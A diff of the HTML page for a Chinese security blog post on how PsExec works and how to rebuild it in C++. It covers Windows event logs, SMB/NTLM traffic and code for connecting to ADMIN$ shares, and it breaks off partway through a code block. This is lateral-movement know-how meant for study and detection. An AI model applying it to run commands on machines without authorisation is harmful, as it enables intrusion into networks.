@@ -1,12 +1,48 @@
-<!doctype html><html lang><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>如何实现一个Psexec « 倾旋的博客</title><meta name=description content="倾旋的博客"><meta name=author content="倾旋"><link rel=stylesheet href=/css/Font-Awesome-5.15.3.all.min.css><link rel=stylesheet href=/sass/researcher.min.css><link rel=icon type=image/ico href=https://payloads.online/favicon.ico></head><body><input type=checkbox id=menu-toggle class=menu-toggle>
-<label tabindex=0 for=menu-toggle class=burger><span></span> <span></span> <span></span><div class=burger-text>Menu</div></label><nav class=main-nav><ul><li><a href=/projects/>Projects</a></li><li><a href=/links/>Links</a></li><li><a href=/post/>Posts</a></li><li><a href=/index.xml>Rss</a></li><li><a href=/tools/>Tools</a></li></ul></nav><nav><a href=/ class=all-posts-link>‹ All Posts</a></nav><div id=content><div class=container><h1>如何实现一个Psexec</h1><p>本文不涉及Pass The Hash的攻击手段，因为使用C/C++实现起来很麻烦，因此本文只围绕Psexec这款工具的实现原理、防御、其他思路展开...</p><div class=toc-wrapper><div class=post-toc id=post-toc><aside><nav id=TableOfContents><ul><li><a href=#0x01-psexec>0x01 Psexec</a></li><li><a href=#0x02-psexec的执行原理>0x02 Psexec的执行原理</a><ul><li><a href=#查看安全日志>查看安全日志</a></li><li><a href=#查看系统日志>查看系统日志</a></li></ul></li><li><a href=#0x03-从网络分析psexec利用过程>0x03 从网络分析Psexec利用过程</a></li><li><a href=#0x04-连接smb共享>0x04 连接SMB共享</a><ul><li><a href=#关于smb上传文件>关于SMB上传文件</a></li></ul></li><li><a href=#0x05-编写服务程序>0x05 编写服务程序</a><ul><li><a href=#servicemain-函数>ServiceMain 函数</a></li></ul></li><li><a href=#0x06-使用windows-api远程管理服务>0x06 使用Windows API远程管理服务</a></li><li><a href=#0x07-psexec完整代码>0x07 PsExec完整代码</a></li><li><a href=#0x08-总结psexec防御>0x08 总结PsExec防御</a></li></ul></nav></aside><a href=# id=toc-toggle></a></div></div><h2 id=0x01-psexec>0x01 Psexec</h2><p>Psexec被编写的初衷是为了方便服务器管理员管理大量的机器而开发的，但由于它的便捷，同时也被黑客使用。</p><p>相信很多人都用过Psexec这款工具了，它由Sysinternals网站提供，Sysinternals这个网站由Mark Russinovich于1996年创建，用于托管他的高级系统实用程序和技术信息。</p><p>下载地址：<a href=https://docs.microsoft.com/en-us/sysinternals/downloads/psexec>https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></p><p>高级用法：<a href=https://www.itprotoday.com/compute-engines/psexec>https://www.itprotoday.com/compute-engines/psexec</a></p><h2 id=0x02-psexec的执行原理>0x02 Psexec的执行原理</h2><p>为了清楚的了解它的执行原理,我们先从日志看起。</p><p>环境：</p><ul><li>Windows 2008 R2 X64 → 192.168.3.130（以下简称Win2008）</li><li>Kali Linux 2019.4 → 192.168.3.145（以下简称Kali）</li><li>Windows 10 → 192.168.3.1（以下简称Win10）</li></ul><p>下载SysinternalsSuite： <a href=https://download.sysinternals.com/files/SysinternalsSuite.zip>https://download.sysinternals.com/files/SysinternalsSuite.zip</a></p><p>首先在Windows 10上对Windows 2008 R2 X64这台机器进行Psexec</p><pre tabindex=0><code>.\PsExec.exe \\192.168.3.130 -u administrator -p 123456 cmd
-</code></pre><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9a80481e-4f5f-11ec-8868-00d861bf4abb.png alt=2020-04-01-14-28-01></p></p><h3 id=查看安全日志>查看安全日志</h3><p>打开Win2008日志查看器，先查看安全（Security）日志：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9ac1e990-4f5f-11ec-b8c6-00d861bf4abb.png alt=2020-04-01-14-28-34></p></p><p>从日志查看器能够看到产生了多个安全审核日志，事件ID：4624，并且能够看到来源IP以及计算机名。</p><p><strong>认证类型NTLM：</strong></p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9afc8960-4f5f-11ec-8a5c-00d861bf4abb.png alt=2020-04-01-14-28-52></p></p><p>接着，还有事件ID为4648的日志，该条目的解释是：</p><blockquote><p>在进程尝试通过显式指定帐户的凭据来登录该帐户时生成此事件。这通常发生在批量类型的配置中(例如计划任务) 或者使用 RUNAS 命令时。</p></blockquote><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9b30adee-4f5f-11ec-bc7e-00d861bf4abb.png alt=2020-04-01-14-29-07></p></p><p>可以看到很明显的PSEXECSVC.exe这个程序被启动。</p><p><strong>目前可以猜测：先进行Windows 认证，然后产生PSEXESVC.exe并启动。</strong></p><h3 id=查看系统日志>查看系统日志</h3><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9b70eecc-4f5f-11ec-8f84-00d861bf4abb.png alt=2020-04-01-14-29-20></p></p><p>事件ID：7045向系统报告了一个名为“PSEXESVC”的服务被安装，同时紧接着事件ID：7036报告“PSEXESVC服务已经启动”。</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9bb77ac2-4f5f-11ec-9ed2-00d861bf4abb.png alt=2020-04-01-14-29-34></p></p><p>通过事件ID报告的顺序，我们大致了解了PsEXEC的动作。</p><ol><li>事件ID：4624</li><li>事件ID：4648</li><li>事件ID：7045</li><li>事件ID：7036</li></ol><p>当PsExec执行exit退出交互式命令行后，会向系统报告事件ID：4634注销事件、事件ID：7036 PSEXESVC服务停止。</p><h2 id=0x03-从网络分析psexec利用过程>0x03 从网络分析Psexec利用过程</h2><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9bfb4126-4f5f-11ec-b938-00d861bf4abb.png alt=2020-04-01-14-30-06></p></p><p>这里我使用Wireshark抓包工具，捕获了整个Psexec建立网络连接到exit退出的整个过程。</p><p>认证大致流程：</p><ol><li>192.168.3.1向192.168.3.130　进行三次握手</li><li>192.168.3.1向192.168.3.130　协商认证方式</li><li>192.168.3.1向192.168.3.130　发送　NTLMSSP_NEGOTIATE</li><li>192.168.3.130向192.168.3.1　发送　NTLMSSP_CHANLLENGE</li><li>192.168.3.1向192.168.3.130　发送　NTLMSSP_AUTH</li><li>192.168.3.130向192.168.3.1　发送　ACCEPT-COMPLETED，至此完成NTLMSSP认证</li></ol><p>接着向<code>\\192.168.3.130\ADMIN$</code>写入<code>PSEXESVC.exe</code>:</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9c3dda9a-4f5f-11ec-aa32-00d861bf4abb.png alt=2020-04-01-14-30-37></p></p><p>在SMBV2传输的过程中,文件内容并没有进行加密,可以直接找到DOS头：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9c7e7fbe-4f5f-11ec-8ce9-00d861bf4abb.png alt=2020-04-01-14-30-53></p></p><blockquote><p>其开始的标志字为“MZ”（MarkZbikowski，他是DOS操作系统的开发者之一），所以称它为“DOS MZ头”。</p></blockquote><p>文件传输后，Psexec会调用<code>OpenServiceManager</code> 来安装服务"PSEXESVC"：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9cbb54f2-4f5f-11ec-8d20-00d861bf4abb.png alt=2020-04-01-14-31-14></p></p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9d07e0d8-4f5f-11ec-a73f-00d861bf4abb.png alt=2020-04-01-14-31-20></p></p><p>PSEXESVC服务启动后会与PsExec.exe构建一个管道进行传输数据(还是走SMB V2协议)：</p><blockquote><p><a href=https://www.itprotoday.com/compute-engines/enterprise-guide-quantum-computing>The Psexesvc service creates a named pipe, psexecsvc, to which PsExec connects and sends commands that tell the service on the remote system which executable to launch and which options you&rsquo;ve specified. If you specify the -d (don&rsquo;t wait) switch, the service exits after starting the executable; otherwise, the service waits for the executable to terminate, then sends the exit code back to PsExec for it to print on the local console.</a></p></blockquote><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9d3fa8ce-4f5f-11ec-a886-00d861bf4abb.png alt=2020-04-01-14-33-01></p></p><p>到这里我想已经差不多足够我们实现一个PsExec了，大致过程如下：</p><ol><li>编写PsEXESVC服务程序</li><li>连接SMB共享</li><li>上传文件到共享目录</li><li>创建服务</li><li>启动服务</li><li>停止服务</li><li>删除服务</li><li>删除文件</li></ol><p>经过搜集资料,我发现主要有以下知识点:</p><ol><li>SMB共享的连接与认证</li><li>SMB共享的文件操作</li><li>管理远程计算机服务</li><li>编写服务程序</li></ol><h2 id=0x04-连接smb共享>0x04 连接SMB共享</h2><p>应用程序可以调用<code>WNetAddConnection</code>函数将本地设备连接到网络资源，成功的连接是持久的，这意味着系统在后续的登录操作期间会自动恢复连接。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>DWORD <span style=color:#a6e22e>WNetAddConnection2W</span>(
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>如何实现一个Psexec - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1">
+<link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script></head><body><div class="container-wide wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=article-nav id=article-nav-id><div class=post><div class=post-header><div class=meta><div class=date><span class=day>02</span>
+<span class=rest>Apr 2020</span></div></div><div class=matter><h1 class=title>如何实现一个Psexec</h1></div></div><aside class="show-on-mobile toc" id=static-toc><header><h3>Contents</h3></header><nav id=TableOfContents><ol><li><a href=#0x01-psexec>0x01 Psexec</a></li><li><a href=#0x02-psexec的执行原理>0x02 Psexec的执行原理</a><ol><li><a href=#查看安全日志>查看安全日志</a></li><li><a href=#查看系统日志>查看系统日志</a></li></ol></li><li><a href=#0x03-从网络分析psexec利用过程>0x03 从网络分析Psexec利用过程</a></li><li><a href=#0x04-连接smb共享>0x04 连接SMB共享</a><ol><li><a href=#关于smb上传文件>关于SMB上传文件</a></li></ol></li><li><a href=#0x05-编写服务程序>0x05 编写服务程序</a><ol><li><a href=#servicemain-函数>ServiceMain 函数</a></li></ol></li><li><a href=#0x06-使用windows-api远程管理服务>0x06 使用Windows API远程管理服务</a></li><li><a href=#0x07-psexec完整代码>0x07 PsExec完整代码</a></li><li><a href=#0x08-总结psexec防御>0x08 总结PsExec防御</a></li></ol></nav></aside><h2 id=0x01-psexec>0x01 Psexec</h2><p>Psexec被编写的初衷是为了方便服务器管理员管理大量的机器而开发的，但由于它的便捷，同时也被黑客使用。</p><p>相信很多人都用过Psexec这款工具了，它由Sysinternals网站提供，Sysinternals这个网站由Mark Russinovich于1996年创建，用于托管他的高级系统实用程序和技术信息。</p><p>下载地址：<a href=https://docs.microsoft.com/en-us/sysinternals/downloads/psexec>https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></p><p>高级用法：<a href=https://www.itprotoday.com/compute-engines/psexec>https://www.itprotoday.com/compute-engines/psexec</a></p><h2 id=0x02-psexec的执行原理>0x02 Psexec的执行原理</h2><p>为了清楚的了解它的执行原理,我们先从日志看起。</p><p>环境：</p><ul><li>Windows 2008 R2 X64 → 192.168.3.130（以下简称Win2008）</li><li>Kali Linux 2019.4 → 192.168.3.145（以下简称Kali）</li><li>Windows 10 → 192.168.3.1（以下简称Win10）</li></ul><p>下载SysinternalsSuite： <a href=https://download.sysinternals.com/files/SysinternalsSuite.zip>https://download.sysinternals.com/files/SysinternalsSuite.zip</a></p><p>首先在Windows 10上对Windows 2008 R2 X64这台机器进行Psexec</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>.\PsExec.exe \\192.168.3.130 -u administrator -p 123456 cmd
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://images.payloads.online/9a80481e-4f5f-11ec-8868-00d861bf4abb.png alt=2020-04-01-14-28-01></p><h3 id=查看安全日志>查看安全日志</h3><p>打开Win2008日志查看器，先查看安全（Security）日志：</p><p><img src=https://images.payloads.online/9ac1e990-4f5f-11ec-b8c6-00d861bf4abb.png alt=2020-04-01-14-28-34></p><p>从日志查看器能够看到产生了多个安全审核日志，事件ID：4624，并且能够看到来源IP以及计算机名。</p><p><strong>认证类型NTLM：</strong></p><p><img src=https://images.payloads.online/9afc8960-4f5f-11ec-8a5c-00d861bf4abb.png alt=2020-04-01-14-28-52></p><p>接着，还有事件ID为4648的日志，该条目的解释是：</p><blockquote><p>在进程尝试通过显式指定帐户的凭据来登录该帐户时生成此事件。这通常发生在批量类型的配置中(例如计划任务) 或者使用 RUNAS 命令时。</p></blockquote><p><img src=https://images.payloads.online/9b30adee-4f5f-11ec-bc7e-00d861bf4abb.png alt=2020-04-01-14-29-07></p><p>可以看到很明显的PSEXECSVC.exe这个程序被启动。</p><p><strong>目前可以猜测：先进行Windows 认证，然后产生PSEXESVC.exe并启动。</strong></p><h3 id=查看系统日志>查看系统日志</h3><p><img src=https://images.payloads.online/9b70eecc-4f5f-11ec-8f84-00d861bf4abb.png alt=2020-04-01-14-29-20></p><p>事件ID：7045向系统报告了一个名为“PSEXESVC”的服务被安装，同时紧接着事件ID：7036报告“PSEXESVC服务已经启动”。</p><p><img src=https://images.payloads.online/9bb77ac2-4f5f-11ec-9ed2-00d861bf4abb.png alt=2020-04-01-14-29-34></p><p>通过事件ID报告的顺序，我们大致了解了PsEXEC的动作。</p><ol><li>事件ID：4624</li><li>事件ID：4648</li><li>事件ID：7045</li><li>事件ID：7036</li></ol><p>当PsExec执行exit退出交互式命令行后，会向系统报告事件ID：4634注销事件、事件ID：7036 PSEXESVC服务停止。</p><h2 id=0x03-从网络分析psexec利用过程>0x03 从网络分析Psexec利用过程</h2><p><img src=https://images.payloads.online/9bfb4126-4f5f-11ec-b938-00d861bf4abb.png alt=2020-04-01-14-30-06></p><p>这里我使用Wireshark抓包工具，捕获了整个Psexec建立网络连接到exit退出的整个过程。</p><p>认证大致流程：</p><ol><li>192.168.3.1向192.168.3.130　进行三次握手</li><li>192.168.3.1向192.168.3.130　协商认证方式</li><li>192.168.3.1向192.168.3.130　发送　NTLMSSP_NEGOTIATE</li><li>192.168.3.130向192.168.3.1　发送　NTLMSSP_CHANLLENGE</li><li>192.168.3.1向192.168.3.130　发送　NTLMSSP_AUTH</li><li>192.168.3.130向192.168.3.1　发送　ACCEPT-COMPLETED，至此完成NTLMSSP认证</li></ol><p>接着向<code>\\192.168.3.130\ADMIN$</code>写入<code>PSEXESVC.exe</code>:</p><p><img src=https://images.payloads.online/9c3dda9a-4f5f-11ec-aa32-00d861bf4abb.png alt=2020-04-01-14-30-37></p><p>在SMBV2传输的过程中,文件内容并没有进行加密,可以直接找到DOS头：</p><p><img src=https://images.payloads.online/9c7e7fbe-4f5f-11ec-8ce9-00d861bf4abb.png alt=2020-04-01-14-30-53></p><blockquote><p>其开始的标志字为“MZ”（MarkZbikowski，他是DOS操作系统的开发者之一），所以称它为“DOS MZ头”。</p></blockquote><p>文件传输后，Psexec会调用<code>OpenServiceManager</code> 来安装服务"PSEXESVC"：</p><p><img src=https://images.payloads.online/9cbb54f2-4f5f-11ec-8d20-00d861bf4abb.png alt=2020-04-01-14-31-14></p><p><img src=https://images.payloads.online/9d07e0d8-4f5f-11ec-a73f-00d861bf4abb.png alt=2020-04-01-14-31-20></p><p>PSEXESVC服务启动后会与PsExec.exe构建一个管道进行传输数据(还是走SMB V2协议)：</p><blockquote><p><a href=https://www.itprotoday.com/compute-engines/enterprise-guide-quantum-computing>The Psexesvc service creates a named pipe, psexecsvc, to which PsExec connects and sends commands that tell the service on the remote system which executable to launch and which options you&rsquo;ve specified. If you specify the -d (don&rsquo;t wait) switch, the service exits after starting the executable; otherwise, the service waits for the executable to terminate, then sends the exit code back to PsExec for it to print on the local console.</a></p></blockquote><p><img src=https://images.payloads.online/9d3fa8ce-4f5f-11ec-a886-00d861bf4abb.png alt=2020-04-01-14-33-01></p><p>到这里我想已经差不多足够我们实现一个PsExec了，大致过程如下：</p><ol><li>编写PsEXESVC服务程序</li><li>连接SMB共享</li><li>上传文件到共享目录</li><li>创建服务</li><li>启动服务</li><li>停止服务</li><li>删除服务</li><li>删除文件</li></ol><p>经过搜集资料,我发现主要有以下知识点:</p><ol><li>SMB共享的连接与认证</li><li>SMB共享的文件操作</li><li>管理远程计算机服务</li><li>编写服务程序</li></ol><h2 id=0x04-连接smb共享>0x04 连接SMB共享</h2><p>应用程序可以调用<code>WNetAddConnection</code>函数将本地设备连接到网络资源，成功的连接是持久的，这意味着系统在后续的登录操作期间会自动恢复连接。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>DWORD <span style=color:#a6e22e>WNetAddConnection2W</span>(
 </span></span><span style=display:flex><span>  LPNETRESOURCEW lpNetResource, <span style=color:#75715e>// 指定建议的连接的详细信息
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>  LPCWSTR        lpPassword, <span style=color:#75715e>// 用户名
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>  LPCWSTR        lpUserName, <span style=color:#75715e>// 密码
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>  DWORD          dwFlags <span style=color:#75715e>// 连接选项
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>);
-</span></span></code></pre></div><p>在这里有详细的参数说明:<a href=https://docs.microsoft.com/zh-cn/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w>https://docs.microsoft.com/zh-cn/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w</a></p><p><strong>返回值:</strong></p><p>如果函数成功，则返回值为<code>NO_ERROR</code>。</p><p>OK，接下来我们创建一个Windows控制台应用程序,我这里使用的是<code>Visual Studio 2019</code></p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9d8432c8-4f5f-11ec-9024-00d861bf4abb.png alt=2020-04-01-14-33-54></p></p><p>创建一个名字叫Psexec的项目：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9dbfdb20-4f5f-11ec-b498-00d861bf4abb.png alt=2020-04-01-14-34-09></p></p><p>紧接着就可以写具体的实现代码了。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>DWORD <span style=color:#a6e22e>ConnectSMBServer</span>(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword)
+</span></span></code></pre></td></tr></table></div></div><p>在这里有详细的参数说明:<a href=https://docs.microsoft.com/zh-cn/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w>https://docs.microsoft.com/zh-cn/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w</a></p><p><strong>返回值:</strong></p><p>如果函数成功，则返回值为<code>NO_ERROR</code>。</p><p>OK，接下来我们创建一个Windows控制台应用程序,我这里使用的是<code>Visual Studio 2019</code></p><p><img src=https://images.payloads.online/9d8432c8-4f5f-11ec-9024-00d861bf4abb.png alt=2020-04-01-14-33-54></p><p>创建一个名字叫Psexec的项目：</p><p><img src=https://images.payloads.online/9dbfdb20-4f5f-11ec-b498-00d861bf4abb.png alt=2020-04-01-14-34-09></p><p>紧接着就可以写具体的实现代码了。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>DWORD <span style=color:#a6e22e>ConnectSMBServer</span>(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword)
 </span></span><span style=display:flex><span>{
 </span></span><span style=display:flex><span>    <span style=color:#75715e>// 用于存放SMB共享资源格式
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>    PWCHAR lpwsIPC <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> WCHAR[MAX_PATH]; 
@@ -34,23 +70,53 @@
 </span></span><span style=display:flex><span>    wprintf(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;WNetAddConnection2 failed with error: %u</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, dwRetVal);
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>测试过程：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9e014114-4f5f-11ec-8aff-00d861bf4abb.png alt=2020-04-01-14-34-46></p></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>wmain</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>wchar_t</span><span style=color:#f92672>*</span> argv[])
+</span></span></code></pre></td></tr></table></div></div><p>测试过程：</p><p><img src=https://images.payloads.online/9e014114-4f5f-11ec-8aff-00d861bf4abb.png alt=2020-04-01-14-34-46></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
